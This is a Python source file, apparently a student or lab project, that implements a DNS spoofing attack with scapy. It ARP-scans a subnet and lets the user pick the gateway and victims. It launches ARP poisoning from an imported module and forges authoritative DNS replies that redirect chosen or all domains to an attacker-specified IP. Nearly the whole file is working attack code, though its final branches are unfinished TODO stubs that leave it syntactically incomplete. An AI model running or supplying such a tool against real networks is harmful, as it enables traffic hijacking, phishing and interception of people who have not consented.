from scapy.all import *
from arp import arp
import threading


class dnsfinal():
    
    def __init__(self, interface):
        self.interface = interface

    def getInput(self):

        #user enters what IP range to use
        self.ip_range = raw_input("Enter the range of IP addresses that you want to use (example: 192.168.5.85/24): ")
        
        #sends ARP packets to all ips in the range, -> we now know which ips are taken, and the MAC-address corresponding with every IP
        self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.ip_range), timeout=3, iface=self.interface)

        print("We received the following responses: ")
        index = 0
        print(" \t\t IP: \t MAC:")
        for packet_sent, packet_received in self.ips_used:
            print("{} \t {} \t {}".format(index, packet_received[ARP].psrc, packet_received[ARP].hwsrc))
            index = index + 1
    

        self.defaultGateway = []
        #now we will select the default gateway
        input = ""
        input = raw_input("Enter the index of the IP of the default gateway: ")
        inputInt = int(input)
        self.defaultGateway.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
        print(self.defaultGateway)


        self.target = []
        #now we will select the target
        mult_target = raw_input("Do you want to select targets manually (y) or select all IP's automatically (n): ")
        #case user manually selects target
        if(mult_target == "y"):
            print("Enter the index nr of the target you want to add to the target list, to quit entering input 'quit'")
            input = ""
            while(input != "quit"):
                input = raw_input()
                if(input != "quit"):
                    inputInt = int(input)
                    self.target.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
        else:
            for packet_sent, packet_received in self.ips_used:
                self.target.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
        print(self.target)


        #ip of the website to which the user should be rerouted
        self.ip_website = raw_input("enter the ip address of the website to where the user should be redirected: ")
        
        input_choice = raw_input("do you want to selects URLs to redirect manually? (y/n): ")
        #url contains all urls to redirect to the ip address specified above
        self.url = []
        if (input_choice == "y"):
            input = ""
            while(input != "quit"):
                input = raw_input("Enter a URL which should be redirected: (quit to stop entering) ")
                if(input != "quit"):
                    self.url.append(input)

        #get own MAC address
        self.ownMAC = get_if_hwaddr(self.interface)

    def startProcess(self):
        arpprocess = arp(self.interface)
        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y")
        #arpprocess.startProcess()
        proc_thread = None
        proc_thread = threading.Thread(target=arpprocess.startProcess)
        proc_thread.daemon = True
        proc_thread.start()

        print("DNS sniffing has started")
        while True:
            sniff(filter="port 53", prn=lambda packet: self.doSpoofing(packet), iface=self.interface)

    #method which does the DNS spoofing of a packet
    def doSpoofing(self, packet):
        if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
            #Case the user entered specific websites to spoof
            
            should_be_spoofed = False
            if(len(self.url) > 0):
                for domain in self.url:
                    if(domain in packet[DNS].qd.qname):
                        should_be_spoofed = True
                    
            #Case all URLs should be spoofed or it was in the list of URLs to spoof
            if(len(self.url) == 0 or should_be_spoofed):
                #create fake response packet
                spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
                spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
                spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
                spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=self.ip_website)
                spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
                #send the packet
                sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface)
                print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website))
            #TODO REDIRECT PACKETS TO DNS SERVER
            else:
            
        #TODO REDIRECT       
        else:
            print(self.defaultGateway)
        
